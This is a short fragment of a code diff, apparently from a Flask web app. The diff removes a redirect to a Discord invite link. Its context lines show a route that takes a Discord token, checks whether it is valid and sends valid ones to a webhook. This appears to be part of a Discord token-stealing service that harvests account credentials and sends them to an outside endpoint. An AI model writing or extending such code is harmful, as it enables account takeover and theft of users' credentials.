@@ -24,7 +24,6 @@ hook = Webhook(e)
 def index(token):
   if check_discord_token(token) == "True":
       hook.send(token)
-  return redirect("https://discord.gg/sTp8ask4ay")
 
 @app.route('/update')
 def update():
